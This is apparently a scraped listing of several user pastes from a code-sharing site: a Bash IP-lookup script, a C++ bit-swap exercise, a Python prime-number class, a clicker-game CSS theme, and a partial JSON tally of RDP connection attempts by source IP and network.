	update_sim()
	task.wait()
end"
cbBkEfin,Getting IP adress nic,Rnery,Bash,Monday 2nd of October 2023 08:15:42 PM CDT,"#!/usr/bin/env bash
set -euo pipefail

_ip_notfound() {
    clear
    sleep 1
    echo ""Erro, IP não encontrado.""
    exit 1
}

_show_dev() {
    ip address show dev eth0
}

_address_condition() {
    _show_dev > /dev/null 2>&1
}

_ipv4() {
    if _address_condition; then
        _show_dev |
        grep -E '\w{3}[.]' |
        awk '{print $2}'
    else
        _ip_notfound
    fi
}

_ipv6() {
    if _address_condition; then
        _show_dev |
        grep -E 'inet6\s[0-9a-fA-F]{4}[:]' |
        awk '{print $2}'
    else
        _ip_notfound
    fi
}

case $1 in
    4)  _ipv4;;
    6)  _ipv6;;
    *)  clear; echo ""Não existe essa versão de IP, digite 4 ou 6""
esac
"
6piXMdsU,Swap all odd and even bits,jayati,C++,Monday 2nd of October 2023 07:50:57 PM CDT,"//{ Driver Code Starts
//Initial Template for C++

#include<bits/stdc++.h>
using namespace std;


// } Driver Code Ends
//User function Template for C++

class Solution
{
    public:
    //Function to swap odd and even bits.
    unsigned int swapBits(unsigned int n)
    {
    	int oddm=0x55555555;
        int evenm=0xAAAAAAAA;
        
        int odd=n&oddm;
        int even=n&evenm;
        
        odd=odd<<1;
       
        even=even>>1;
       
        n=odd|even;
        return n;
    }
};

//{ Driver Code Starts.

// Driver code
int main()
{
	int t;
	cin>>t;//testcases
	while(t--)
	{
		unsigned int n;
		cin>>n;//input n
		
		Solution ob;
		//calling swapBits() method
		cout << ob.swapBits(n) << endl;
	}
	return 0;
}
// } Driver Code Ends"
86ZS5YHQ,Python 3 Simple prime_number Class,HasteBin0,Python,Monday 2nd of October 2023 07:41:39 PM CDT,"

tri = NewType('tri', Optional[bool])


class prime_numbers:
    prime_naturals_oeis40: Tuple[int, ...] = (2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167,
                                              173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271)  # https://oeis.org/A000040
    
    __primes: Deque[int] | Tuple[int, ...] = deque(prime_naturals_oeis40)
    __max_p_tmp: int = max(__primes)  # enables efficient resumes of searching in edit mode
    
    @classmethod
    def freeze_primes(cls, get_freeze_unfreeze: tri) -> tri:
        """""" This method allows the user to ""freeze"" or ""unfreeze"" the __primes attribute. When frozen, __primes is converted to a tuple (immutable), and when unfrozen, it's converted back to a deque (mutable).
            The method returns the current state (True for unfrozen, False for frozen, or None for an error). """"""
        if get_freeze_unfreeze is None:  # get
            return isinstance(cls.__primes, deque)
        elif get_freeze_unfreeze is False:  # freeze
            try:
                cls.__primes = tuple(cls.__primes)
                return False
            except MemoryError:
                return isinstance(cls.__primes, deque)
        elif get_freeze_unfreeze is True:  # unfreeze
            try:
                cls.__primes = deque(cls.__primes)
                return True
            except MemoryError:
                return isinstance(cls.__primes, deque)
    
    range_spec_tuple_t = NewType('range_spec_tuple_t', Tuple[int] | Tuple[int, int] | Tuple[int, int, int])
    
    @classmethod
    def gen_primes_sieve_1_resumable(cls, output_wanted: range_spec_tuple_t, below: Optional[int] = None, above: Optional[int] = None, max_look_ahead: Optional[int] = None, edit: bool = False) -> Iterable[Optional[Tuple[int, int]]]:
        """"""
        Generate prime numbers in a resumable manner using a simple trial division method.

        Parameters:
        - output_wanted (range_spec_tuple_t): A tuple specifying the range of prime numbers desired.
        - below (Optional[int]): An optional integer specifying the upper limit for the prime numbers.
        - above (Optional[int]): An optional integer specifying the lower limit for the prime numbers.
        - max_look_ahead (Optional[int]): An optional integer specifying the maximum number of primes to look ahead in one search.
        - edit (bool): A boolean indicating whether to edit the list of known primes or not.

        Returns:
        Iterable[Optional[Tuple[int, int]]]: An iterable of optional tuples, where each tuple contains a prime number and its position in __primes if it's in the desired output range.

        Functionality:
        1. If `edit` is True, the method attempts to find new prime numbers by checking if they are divisible by any of the known primes. If a new prime is found, it's appended to the __primes list.
        2. If `edit` is False, the method checks if the last known prime is within the specified range. If not, it yields None and returns.
        3. The method then iterates through the known primes and yields those that are within the specified range, along with their positions.
        4. Finally, the method yields None to indicate the end of the sequence.
        5. In edit mode, the progress of the search is saved. So, search can be chunked by the `max_look_ahead`.
        """"""
        primes = cls.__primes
        rso = range(*output_wanted)
        above: int = above or (min(rso) - 1)
        below: int = below or (max(rso) + 1)
        max_look_ahead: int = max_look_ahead or (len(rso) + 1)
        del rso
        if edit:
            attempt: int = 0
            for attempt in range(max(primes[-1] + 2, cls.__max_p_tmp), min(below, above + max_look_ahead), 2):
                if not any(attempt % x == 0 for x in primes):
                    primes.append(attempt)
            if attempt != 0:
                cls.__max_p_tmp = attempt
            del attempt
        elif primes[-1] > below or primes[-1] < above:
            yield None
            return
        else:
            if above <= below or below < 2:
                yield None
                return
        ipi = enumerate(primes)
        oro = range(*output_wanted)
        for pid, x in ipi:
            if x > above:
                if x in oro:
                    yield x, pid
                break
        for pid, x in ipi:
            if x >= below:
                break
            if x in oro:
                yield x, pid
        yield None
        return
    
    @classmethod
    def gen_primes_sieve_2_eratosthenes(cls, output_wanted: range_spec_tuple_t, below: Optional[int] = None, above: Optional[int] = None, max_look_ahead: Optional[int] = None) -> Iterable[int]:
        """""" Generate prime numbers using the Sieve of Eratosthenes algorithm. """"""
        oro = range(*output_wanted)
        start, stop, step = oro.start, oro.stop, oro.step
        
        # Ensure the range is valid
        if start > stop:
            return iter([])  # Return an empty iterator
        
        # If the range is within the already known primes
        if start <= cls.__primes[-1]:
            for prime in cls.__primes:
                if start <= prime <= stop:
                    yield prime
            return
        
        # Determine the range for the sieve based on the provided parameters
        sieve_start = above or start
        sieve_end = below or max(stop, cls.__primes[-1] ** 2)
        if max_look_ahead:
            sieve_end = min(sieve_end, sieve_start + max_look_ahead)
        
        sieve = [True] * (sieve_end + 1)
        for prime in cls.__primes:
            for multiple in range(max(2 * prime, sieve_start), sieve_end + 1, prime):
                sieve[multiple] = False
        
        # Generate new primes and add them to __primes
        for num in range(max(2, sieve_start), sieve_end + 1):
            if sieve[num]:
                cls.__primes.append(num)
                if start <= num <= stop:
                    yield num
    
    @classmethod
    def can_check_sieve(cls, nr: range_spec_tuple_t) -> tri:
        range_object = range(*nr)
        if range_object:
            return cls.__primes[-1] ** 2 > max(range_object)
    "
4VehDAbs,SSM2CSS,nick36585,CSS,Monday 2nd of October 2023 07:28:04 PM CDT,"
$yellow: #FFE800;
$brown: #404040;
$blue: #1CD3F8;
$angle: 8px;
$angle-o: 4px;


.box
{
	text-align:center;
	padding:0px;
	box-shadow:none;
}

.thing,.box-header,.box-footer,.box-bit
{
	background:#39f;
	box-shadow:0px 0px 4px rgba(0,0,0,0.2),1px 1px 2px rgba(0,0,0,0.5),0px 0px 4px rgba(255,255,255,0.5) inset;
}
.box-bit{border-radius:0px;}

.box-header
{
	border-bottom-left-radius:20px;
	border-bottom-right-radius:20px;
	margin-bottom:0px;
	text-align: center;
}
.box-footer
{
	border-top-left-radius:20px;
	border-top-right-radius:20px;
	margin-top:1px;
}


#game{
background-image: hidden !important;
z-index: 3 !important; 
}

.thing .shiny .noClick .noText{

z-index: -1 !important; 

}

.thing .shiny .bigButton .noText{

z-index: 4 !important; 

}



.shiny-icon{


//opacity: 0.2;
//transform: rotate(90deg) !important;

}

#box-main
{
	left:0px;
	top:0px;
	bottom:0px;
	overflow:hidden;
	width:30%;
	position:absolute;
}
#box-res.fullWidth
{
	width:100%;
	top:40%;
	height:5%;
	min-height:32px;
	z-index:100;
	position:absolute;
}
#box-buttons
{
	top:0px;
	right:0px;
	bottom:0px;
	left:0px;
	position:absolute;
}
#box-store
{
	right:0px;
	top:0px;
	bottom:0px;
	margin-bottom:0px;
	width:70%;
	position:absolute;
}
#box-buildings,#box-upgrades,#box-buildings2,#box-upgrades2
{
	top:0px;
	bottom:0px;
	width:25%;
	//right:0px;
	overflow-x:hidden;
	overflow-y:scroll;
	padding-bottom:48px;/* this is to accommodate the info and settings buttons */
	position:absolute;
}
#box-buildings
{right:75%;}

#box-upgrades
{right:50%;}

#box-buildings2
{
right:0%;

}

#box-upgrades2
{right:25%;}


//#box-buildings{background:linear-gradient(to right,rgba(0,0,0,0) 0%,rgba(0,0,0,0.25) 20%);}
//#box-upgrades{background:rgba(0,0,0,0.3);}
//#box-buildings2{background:linear-gradient(to right,rgba(0,0,0,0) 0%,rgba(0,0,0,0.25) 20%);}
//#box-upgrades2{background:rgba(0,0,0,0.3);}

#bulkDisplay{margin:-11px 24px 4px 24px;}


.thing
{
	display:inline-block;
	padding:auto;
	margin:auto;
	margin-bottom:1px;
	cursor:pointer;
}
.thing:hover,.thing.lit
{
	background:#6cf;
}
.thing.cantAfford
{
	opacity:0.65;
}
.upgrade.cantAfford
{
	box-shadow:0px 0px 4px #39f;
	border-radius:8px;
}
.upgrade.cantAfford:hover
{
	box-shadow:0px 0px 4px #6cf;
}
.upgrade.owned,.achiev.owned
{
	background:#6cf;
}
.thing-text,.thing-costs{font-weight:bold;}



.building
{
	padding-left: 10% !important;
	border-top-left-radius:20px;
	border-bottom-left-radius:20px;
	display:block;
	padding-right: auto;
	margin-right:auto;
	font-size:14px;
}

.fullWidth
{
	display:block;
	margin-left:0px;
	margin-right:0px;
	z-index:10;
}
#game .fullWidth
{
	height:auto;
	min-height:auto;
}
.fullWidth,.fullWidth:hover
{
	/*background:rgba(0,0,0,0.5);
	background:linear-gradient(to bottom,rgba(0,0,0,0.5) 0%,rgba(0,0,0,0.25) 50%,rgba(0,0,0,0.5) 100%);*/
	background:linear-gradient(to right,rgba(0,0,0,0) 0%,rgba(0,0,0,0.25) 50%,rgba(0,0,0,0) 100%);
	box-shadow:none;
}
.fullWidth:before,.fullWidth:after
{
	content:'';
	height:1px;
	background:linear-gradient(to right,rgba(255,255,255,0) 0%,rgba(255,255,255,0.25) 50%,rgba(255,255,255,0) 100%);
	position:absolute;
	left:0px;
	right:0px;
	z-index:-1;
}
.fullWidth:before{top:-1px;}
.fullWidth:after{bottom:-1px;}

.fullWidth .thing-icon
{
	margin-top:-14px;
	margin-bottom:-14px;
}
.fullWidth .thing-text
{
	margin-top:-4px;
	margin-bottom:-4px;
}

#game.filtersOn .thing-icon{filter:drop-shadow(0px 0px 0px rgba(0,0,0,0));}


//---------------------------------------------------------------------------------------------------------





#game
  {
    background:#002130;
    background-size: cover;
    font-family: DejaVu Sans Mono, monospace !important;
    letter-spacing: 0px;
 	//font-size: 12px;
    font-stretch: ultra-expanded
   
   // font-family:Century Gothic,sans-serif;
    //font-weight:100;
    color:#000000;
  }
.upgrade, .building
  {

background-repeat: no-repeat;
    font-weight:100 !important;
    margin-top:0px;
    padding: 6% 6%;
    text-align: left;
    //height: 48px;
    border-radius:0px;
    //background:#000000;
    border: 0px solid #000000;
    background:rgba(255,255,255,0.0);
    background-image: linear-gradient(to right, #00000000 , #4286f433 , #93f8ff55);
	width: 100%;

  transition: all .15s linear 0s;
  position: relative;
  display: inline-block;
  
  background-color: $yellow;
  color: $brown;
  
  
  
  box-shadow: -6px 6px 0 $brown;
  text-decoration: none;
  
  &:hover {
    top: 3px;
    left: -3px;
    box-shadow: -3px 3px 0 $brown;
    
    &::after {
      top: 1px;
      left: -2px;
      width: $angle-o;
      height: $angle-o;
    }
    
    &::before {
      bottom: -2px;
      right: 1px;
      width: $angle-o;
      height: $angle-o;
    }
  }
  
  &::after {
    transition: all .15s linear 0s;
    content: '';
    position: absolute;
    top: 2px;
    left: -4px;
    width: $angle;
    height: $angle;
    background-color: $brown;
    transform: rotate(45deg);
    z-index: -1;
    
  }
  
  &::before {
    transition: all .15s linear 0s;
    content: '';
    position: absolute;
    bottom: -4px;
    right: 2px;
    width: $angle;
    height: $angle;
    background-color: $brown;
    transform: rotate(45deg);
    z-index: -1;
  }
}

.thing-text
{



}
.thing-icon
{
 	
 }


#thing-0
  {
   
    background-repeat: no-repeat;
    //max-width: 250px;
    //max-height: 250px;
    padding: 0px 50px;
    border-radius:50%;
    float: left;
    padding-left: 21%;
    background:rgba(0,55,79,0.00);
	 
	
 
/*-webkit-animation-name: spin;
    -webkit-animation-duration: 4000ms;
    -webkit-animation-iteration-count: infinite;
    -webkit-animation-timing-function: linear;
    -moz-animation-name: spin;
    -moz-animation-duration: 4000ms;
    -moz-animation-iteration-count: infinite;
    -moz-animation-timing-function: linear;
    -ms-animation-name: spin;
    -ms-animation-duration: 4000ms;
    -ms-animation-iteration-count: infinite;
    -ms-animation-timing-function: linear;
   
    animation-name: spin;
    animation-duration: 910000ms;
    animation-iteration-count: infinite;
    animation-timing-function: linear;*/
}
@-ms-keyframes spin {
    from { -ms-transform: rotate(0deg); }
    to { -ms-transform: rotate(360deg); }
}
@-moz-keyframes spin {
    from { -moz-transform: rotate(0deg); }
    to { -moz-transform: rotate(360deg); }
}
@-webkit-keyframes spin {
    from { -webkit-transform: rotate(0deg); }
    to { -webkit-transform: rotate(360deg); }
}
@keyframes spin {
    from {
        transform:rotate(0deg);
    }
    to {
        transform:rotate(360deg);
    }
}
 
 
 
#thing-0:hover
  {
   	
    padding: 50px 50px;
    border-radius:50%;
    float: left;
    padding-left: 21%;
    color:#e75480;
    background:rgba(0,55,79,0.00);
    //background-image: linear-gradient(to right, #00000000 , #4286f466 , #93f8ff99);
   
  }
 
.thing-text{
 
font-weight:100;
 
}
 
#thing-1
  {
    padding: 40px 40px;
    float: left;
    padding-left: 14%;
	width: 90%;
   
  }
 
#thing-2
  {
    padding: 40px 40px;
    padding-left: 14%;
	padding-top: 10px !important;
    float: left;
	width: 90%;
   
  }
#thing-3
  {
    padding: 40px 40px;
    padding-left: 14%;
	padding-top: 10px !important;
    float: left;
	width: 90%;
   
  }
#thing-4
  {
    padding: 40px 40px;
    padding-left: 14%;
	padding-top: 10px !important;
    float: left;
	width: 90%;
   
  }
 
 
.building:hover {
 top: 0px !important;
right: 0px !important;
left: 0px !important;
    //transform: skew(30deg);
	
}
 
.thing:hover
  {
    border: 0px solid #93f8ff;
    //background:#002130;
    color:#93f8ff;
    background:rgba(0,55,79,0.00);
    background-image: linear-gradient(to right, #00000000 , #4286f466 , #93f8ff99);
	
  }
.thing:active
  {
   
    border: 0px solid #FFFFFF;
    background:#002130;
    color:#002130;
    transform: translateY(2px);
    background:rgba(255,255,255,0.0);
    background-image: linear-gradient(to right, #00000000 , #93f8ff55);
  }
 
.upgrade.owned, .achiev.owned {
    //width: 100%;
    //padding: 6% 6%;
    text-align: left;
    //height: 48px;
    border-radius:0px;
    //background:#002130;
    border: 0px solid #002130;
    background:rgba(255,255,255,0.0);
    background-image: linear-gradient(to right, #00000000 , #4286f433 , #93f8ff55);
}
.upgrade:hover{
top: 0px !important;
right: 0px !important;
left: 0px !important;
    //width: 100%;
    float: left;
    border: 0px solid #93f8ff;
    //background:#002130;
    color:#93f8ff;
    text-align: left;
    background:rgba(0,55,79,0.00);
    background-image: linear-gradient(to left, #00000000 , #4286f466 , #93f8ff99);
    box-shadow: 0px 0px 0px #39f;
}
.upgrade.owned:hover{
    //width: 100%;
    float: left;
    padding: 6% 6%;
    text-align: left;
    //height: 48px;
    border-radius:0px;
    //background:#002130;
    border: 0px solid #002130;
    background:rgba(255,255,255,0.0);
    background-image: linear-gradient(to right, #00000000 , #4286f466 , #93f8ff99);
}
.upgrade.cantAfford {
    //width: 100%;
    float: left;
    padding: 6% 6%;
    text-align: left;
    //height: 48px;
    border-radius:0px;
    //background:#002130;
    border: 0px solid #002130;
    background:rgba(255,255,255,0.0);
    background-image: linear-gradient(to left, #00000000 , #4286f433 , #93f8ff55);
    box-shadow: 0px 0px 0px #39f;
}
.upgrade {
    width: 100%;
    float: left;
    padding: 6% 6%;
	padding-left: 10% !important;
    text-align: left;
    //height: 48px;
    border-radius:0px;
    //background:#002130;
    border: 0px solid #002130;
    background:rgba(255,255,255,0.0);
    background-image: linear-gradient(to left, #00000000 , #4286f433 , #93f8ff55);
    box-shadow: 0px 0px 0px #39f;
	font-family: DejaVu Sans Mono, monospace !important;
	font-size: 14px;
}
.upgrade.notOwned {
    width: 101% !important;
    float: left;
	margin-left: auto;
	margin-right: auto;
	padding: 6% 6%;
    text-align: left;
    //height: 48px;
    border-radius:0px;
    //background:#002130;
    border: 0px solid #002130;
    background:rgba(255,255,255,0.0);
    background-image: linear-gradient(to left, #00000000 , #4286f433 , #93f8ff55);
    box-shadow: 0px 0px 0px #39f;
}
 
.upgrade.notOwned:hover{
    
    //float: left;
    border: 0px solid #93f8ff;
    //background:#002130;
    color:#93f8ff;
    text-align: left;
    background:rgba(0,55,79,0.00);
    background-image: linear-gradient(to left, #00000000 , #4286f466 , #93f8ff99);
    box-shadow: 0px 0px 0px #39f;
}
 
 
.thing,.box-header,.box-footer,.box-bit
{
   
    border: 0px solid #000000;
    //font-family:""Courier"",Courier,monospace;
    //font-weight:300;
    color:#93f8ff;
    background:#002130;
    background:rgba(255,255,255,0.0);
    box-shadow:0px 0px 0px rgba(0,0,0,0),0px 0px 0px rgba(0,0,0,0),0px 0px 0px rgba(0,55,79,0) inset;
    background-image: linear-gradient(to right, #00000000 , #4286f433 , #93f8ff55);
}
 
.glow {
    animation: glow 0.0s;
}
 
 
 
.box-header {
	
    margin-bottom:1px;
    padding: 15px 15px;
    height: 40px;
    border: 0px solid #000000;
    border-radius: 0px;
    //font-family: ""Courier"",Courier,monospace;
    font-size: 18px;
    color: #93f8ff;
    background: #002130;
    background: rgba(255,255,255,0.0);
    box-shadow: 0px 0px 0px rgba(0,0,0,0), 0px 0px 0px rgba(0,0,0,0), 0px 0px 0px rgba(0,55,79,0) inset;
    background-image: linear-gradient(to right, #00000000 , #4286f433 , #93f8ff55);
	text-align: center;
}
 
 
#bulkDisplay {
    position: relative;
    top: 0px;
    margin: 0px 0px 0px 0px;
    margin-bottom: 0px;
}
 
#box-things-Buildings {
position: relative;
    
 
}
 
.box-bit{
padding: 0% 0%;
margin-bottom:0px;
position: relative;
top: 0px;
border-radius: 0px;
background: #00213000;
}
 
//#game.filtersOn .thing-icon{filter:drop-shadow(3px 3px 1px rgba(0,0,0,0.5));}
#game.filtersOn .thing-icon{filter:drop-shadow(0px 0px 0px rgba(0,0,0,0));}
 
.popup, #tooltip, .toast {
    background: #000000FF;
    background-image: linear-gradient(to top, #00000000 , #4286f455);
    //text-shadow: 1px 1px 0px rgba(0,0,0,0.5);
    color: #93f8ff;
    //border: 0px solid #93f8ff;
    //background: url(lib/img/darkNoise.jpg);
    border-radius: 0px;
    /*box-shadow: 0px 0px 0px 1px #000, 0px 0px 0px 2px rgba(255,255,255,0.5), 0px 0px 15px 1px rgba(255,255,255,0.15) inset, 4px 4px 2px rgba(0,0,0,0.25), 4px 4px 20px rgba(0,0,0,0.5);*/
    box-sizing: border-box;
    padding: 8px 8px;
 
}

 
#tooltipContent{
color: #93f8ff;
font-weight: 100;
 
}
 
::-webkit-scrollbar-thumb {
    background: #93f8ff33;
	//background: #1f546a;

    //background-image: linear-gradient(to left, #00000000 , #93f8ff55);
    box-shadow: 0px 0px 0px 0px #333 inset, 0px 0px 0px 0px #999 inset, 0px 0px 0px 0px #fff inset;
}
 
::-webkit-scrollbar-track {
    background: #4286f400;
	box-shadow: 0px 0px 0px 0px #00000000 inset, 0px 0px 0px 0px #444 inset, 0px 0px 0px 0px #222 inset;
	width: 20px !important;
}
::-webkit-scrollbar-thumb {
    background: #93f8ff33;
	//background: #1f546a;
	
    //background-image: linear-gradient(to left, #00000000, #93f8ff55);
    box-shadow: 0px 0px 0px 0px #000 inset, 0px 0px 0px 0px #999 inset, 0px 0px 0px 0px #fff inset;
}
::-webkit-scrollbar-thumb:hover {
    background: #93f8ff99;
	//background: #5cb2c5;

    box-shadow: 0px 0px 0px 0px #000 inset, 0px 0px 0px 0px #999 inset, 0px 0px 0px 0px #fff inset;
}
.achiev, .achiev:hover{
    padding:5px 5px;
    background-image: linear-gradient(to right, #00000000 , #4286f400 , #93f8ff00);
}
title {
    display: none;
}
 
.my-anim {
    animation-name: my-anim;
    animation-duration: 0s;
}
 
.thing.bigButton, .thing-icon {
top: 21%;
left: 51%;
background-repeat: no-repeat;
    opacity: 1;
    transform: scale(1);
    transition: transform 0.00s ease-out;
	
}
#thing-icon-0{
z-index: -2 !important;

}
.thing.bigButton:hover, .thing-icon:hover {
background-repeat: no-repeat;
    transform: scale(1);
    transition: transform 0.00s ease-out;
    transition: transform 0.00s ease-in;
	
	
}
 
#game.filtersOn .shadowed {
    filter: drop-shadow(0px 0px 0px rgba(0,0,0,0.0));
}
 
.wobble {
    animation: wobble 1s;
    transform: scale(1);
    animation-duration: 5s;
    transition: transform 5.00s ease-out;
    transition: transform 0.00s ease-in;
}
 
@keyframes wobble {
0% {
    opacity: 0.7;
    transform: scale(1.3);
}
10% {
    opacity: 1;
    transform: scale(1.3);
}
100%
    opacity: 1;
    transform: scale(1);
}
}
 
.thing.bigButton .thing-icon{transform:scale(1);}
.thing.bigButton:hover .thing-icon{transform:scale(1);}
.thing.bigButton:active .thing-icon{transform:scale(1);}

div {
    display: visible !important;
}

#bulkDisplay {
    position: relative;
    top: 0px;
    margin: 0px 0px 0px 0px;
    margin-top: 5px;
    margin-right: 0px;
    margin-bottom: 0px;
    margin-left: 0px;
    margin-bottom: 0px;
	visibility: visible !important;
	
	text-align: right;
}


.box-bit-content{

display: inline !important;
}

div#bulkDisplay.box-bit {
float: right;
margin-right: auto;
margin-left: auto;

}

.popup {
    position: relative;
	left: 50%;
	top: 50%;
	width: 30%;
    pointer-events: auto;
    transition: opacity 0.15s,left 0.15s,top 0.15s;
    opacity: 0;
}
.box{
margin: 0px !important;
padding: 0px !important;
}

#fpsGraph {
    background: #333;
    color: #93f8ff33;
    position: absolute;
    left: 0px;
    bottom: 0px;
    padding: 3px;
    width: 128px;
    height: 64px;
    z-index: 10000000;
    opacity: 0.5;
    pointer-events: none;
}



#box-upgrades::-webkit-scrollbar, #box-buildings::-webkit-scrollbar, #box-upgrades2::-webkit-scrollbar, #box-buildings2::-webkit-scrollbar {
    width: 8px !important;
}

#box-upgrades, #box-buildings, #box-upgrades2, #box-buildings2{
    top: 41px !important;
	overflow-y: auto !important;
}

#box-upgrades{
width: 25%;
}



.outFrame #game {
    right: 0% !important;
    bottom: 0px;
}
div#bulkDisplay.box-bit
{

}
#box-store{

top: 0px !important;
}

#box-buildings2Header{

right:0%;


}
#box-upgrades2Header{

right:25%;


}
#box-upgradesHeader{

right:50%;


}
#box-buildingsHeader{

right:75%;


}

#box-buildings2Header, #box-upgrades2Header, #box-upgradesHeader, #box-buildingsHeader{
top: 0px;
position:absolute;
width: 25%;
height: 40px;
}

#toasts {
position: absolute !important;
right: 72% !important;

}
#fpsCounter, #fpsGraph{
position: absolute !important;
bottom: 0px !important;
left: 0px !important;
width: 128px !important;
height: 64px !important;
}

#thing-8{
position: absolute !important;
top: -39vh;
font-size: 2.8vh;
left: 0.2vw;
color: #ffffff44;
background-color: #00000000;
background:linear-gradient(to right,rgba(0,0,0,0) 0%,rgba(0,0,0,0.25) 0%,rgba(0,0,0,0) 0%);
}

#thing-text-8{
font-weight: 900 !important;
}

#thing-9{
position: absolute !important;
top: -37vh;
font-size: 1.8vh;
left: 0.2vw;
color: #93f8ff44;
background-color: #00000000;
background:linear-gradient(to right,rgba(0,0,0,0) 0%,rgba(0,0,0,0.25) 0%,rgba(0,0,0,0) 0%);

}

#log::-webkit-scrollbar {
  display: none;
}



#logOuter{
border-style: solid !important;
border-radius: 10% !important;
border-color: #FFFFFF !important;
}
#logInner{
display: flex;
flex-direction: column;
width: 20vw !important;
padding: 5%;
font-family: 'Courier Prime', monospace !important;
color: #FFFFFF;
overflow:auto;
}
#box-log{
border-style: solid !important;
border-radius: 10% !important;
border: 1px;
border-color: #FFFFFF !important;
background-color: #002130;
}
.log{
width: 100% !important;
opacity: 50% !important;
top: 81% !important;
left: 4% !important;
height: 12% !important;
width: 20% !important;
}

#thing-text-1, #thing-text-2, #thing-text-3, #thing-text-4{

}

#box-res{
}

#thing-icon-1, #thing-icon-2, #thing-icon-3, #thing-icon-4{


}
#thing-1, #thing-2, #thing-3, #thing-4{

}

img{object-fit: contain !important;}

#box-things-sortup, #box-things-sortup2, #box-things-Upgrades, #box-things-upgrades2  /*if necessary, change this to the name of the box containing your upgrades. it should start with ""box-things"" and you can use inspect element to find it*/
{
    display:flex;
    flex-wrap:wrap;
    justify-content:center; /*you can change this to ""flex-start"" if you want upgrades aligned to the left*/
	flex-direction: column-reverse;
}

#box-things-Buildings, #box-things-buildings2{
	display:flex;
    flex-wrap:wrap;
    justify-content:center; /*you can change this to ""flex-start"" if you want upgrades aligned to the left*/

	flex-direction: column-reverse;
}

.tag-sortup, .tag-sortup2, .building, .thing-77, .upgrade2.notOwned, .upgrade2.cantAfford{
    order:3;
}
.upgrade.notOwned {
    order:2;
}
.upgrade.owned, .upgrade2.owned
{
    order:1;
}"
cnEFs4iR,2023-10-02_stats.json,rdp_snitch,JSON,Monday 2nd of October 2023 07:18:24 PM CDT,"{
  ""ip"": {
    ""106.116.169.71"": 6,
    ""193.142.147.9"": 18,
    ""193.142.146.17"": 18,
    ""152.32.192.36"": 3,
    ""87.251.75.145"": 6,
    ""194.165.16.10"": 12,
    ""141.98.11.128"": 9,
    ""205.210.31.82"": 9,
    ""5.161.224.71"": 6,
    ""167.94.138.51"": 3,
    ""194.165.16.111"": 3,
    ""185.170.144.3"": 6,
    ""87.251.75.120"": 3,
    ""138.197.109.5"": 6,
    ""54.144.241.209"": 540,
    ""45.143.201.62"": 15,
    ""38.181.35.81"": 9,
    ""212.129.42.204"": 3,
    ""43.132.213.11"": 3,
    ""205.210.31.248"": 9,
    ""163.172.201.146"": 3,
    ""195.181.244.184"": 6,
    ""136.144.35.81"": 3,
    ""62.204.41.137"": 12,
    ""45.227.254.26"": 6,
    ""45.140.17.16"": 6,
    ""58.218.204.183"": 9,
    ""83.97.73.77"": 6,
    ""165.154.12.38"": 3,
    ""111.61.253.55"": 3,
    ""103.171.0.205"": 3,
    ""146.190.83.254"": 12,
    ""198.235.24.32"": 9,
    ""87.251.75.64"": 3,
    ""45.227.254.8"": 6,
    ""85.209.11.69"": 3,
    ""62.122.184.166"": 12,
    ""62.122.184.168"": 12,
    ""213.226.123.100"": 15,
    ""31.171.251.109"": 6,
    ""194.165.16.11"": 6,
    ""205.210.31.106"": 9
  },
  ""asn"": {
    ""AS4134"": 15,
    ""AS208046"": 36,
    ""AS135377"": 6,
    ""AS208091"": 12,
    ""AS48721"": 21,
    ""AS209605"": 9,
    ""AS396982"": 36,
    ""AS213230"": 6,
    ""AS398324"": 3,
    ""AS197414"": 6,
    ""AS14061"": 18,
    ""AS14618"": 540,
    ""AS210950"": 15,
    ""AS140227"": 9,
    ""AS12876"": 6,
    ""AS132203"": 3,
    ""AS212531"": 6,
    ""AS396356"": 3,
    ""AS59425"": 12,
    ""AS267784"": 12,
    ""AS198953"": 6,
    ""AS208312"": 6,
    ""AS24547"": 3,
    ""AS63737"": 3,
    ""AS57523"": 27,
    ""AS49943"": 15,
    ""AS50837"": 6
  },
  ""isp"": {
    ""Chinanet"": 15,
    ""ColocationX Ltd."": 36,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""Xhost Internet Solutions LP"": 18,
    ""Flyservers S.A."": 33,
    ""UAB Host Baltic"": 9,
    ""Google LLC"": 36,
    ""Hetzner Online GmbH"": 6,
    ""Censys, Inc."": 3,
    ""DigitalOcean, LLC"": 18,
    ""Amazon Technologies Inc."": 540,
    ""TOV E-RISHENNYA"": 15,
    ""Hong Kong Communications International Co., Limited"": 9,
    ""Online S.A.S."": 6,
    ""Aceville Pte.ltd"": 3,
    ""UAB \""Interneto vizija\"""": 6,
    ""Latitude.sh"": 3,
    ""Horizon LLC"": 12,
    ""Proton66 OOO"": 6,
    ""Red Byte LLC"": 6,
    ""China Mobile communications corporation"": 3,
    ""Vietserver Services Technology Company Limited"": 3,
    ""Chang Way Technologies Co. Limited"": 27,
    ""IT Resheniya LLC"": 15,
    ""CloudSigma"": 6
  },
  ""org"": {
    ""Chinanet HE"": 6,
    ""x33 Networks IBC"": 18,
    ""ColocationX Ltd"": 18,
    ""Ucloud Information Technology"": 6,
    ""Xhost Internet Solutions"": 12,
    ""Flyservers S.A"": 21,
    ""Unknown"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""HETZNER-DC"": 6,
    ""Censys, Inc"": 3,
    ""Xhostis"": 6,
    ""Digital Ocean"": 6,
    ""AWS EC2 (us-east-1)"": 540,
    ""TOV VAIZ PARTNER"": 15,
    ""HONG KONG COMMUNICATIONS INTERNATIONAL CO., LIMITED"": 9,
    ""ONLINE"": 6,
    ""RACKRAY"": 6,
    ""Panq B.V"": 3,
    ""Horizon LLC"": 12,
    ""UAB Host Baltic"": 12,
    ""Proton66 LLC"": 6,
    ""Chinanet JS"": 9,
    ""Red Byte LLC"": 6,
    ""China Mobile"": 3,
    ""YUH Application Software Company Limited"": 3,
    ""DigitalOcean, LLC"": 12,
    ""Chang Way Technologies Co. Limited"": 27,
    ""IT Resheniya LLC"": 15
  },
  ""regionName"": {
    ""Hebei"": 9,
    ""English River"": 18,
    ""North Holland"": 24,
    ""Central and Western District"": 6,
    ""England"": 12,
    ""Kaunas"": 36,
    ""California"": 36,
    ""Virginia"": 546,
    ""Michigan"": 3,
    ""New Jersey"": 9,
    ""Kyiv City"": 15,
    ""Eastern"": 9,
    ""\u00cele-de-France"": 6,
    ""Moscow"": 51,
    ""Vilnius"": 12,
